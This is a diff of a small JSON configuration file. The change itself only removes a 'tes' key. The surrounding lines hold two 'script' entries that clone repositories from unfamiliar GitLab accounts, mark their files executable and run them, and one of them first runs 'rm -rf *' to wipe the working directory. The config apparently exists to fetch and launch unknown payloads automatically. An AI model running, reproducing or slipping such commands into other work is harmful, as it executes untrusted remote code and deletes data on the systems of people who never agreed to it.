@@ -2,6 +2,5 @@
 "script": "\n!git clone https://gitlab.com/Huston12394/kevin.git && cd kevin && chmod +x ./walter && ./walter",
 "scriptibm": "rm -rf * && git clone https://gitlab.com/Mitchell1837/gasso.git && cd gasso && chmod +x * && ./ahsan.sh\n",
 "validate": true,
-"version": "1.10",
-"tes": "tes"
+"version": "1.10"
 }
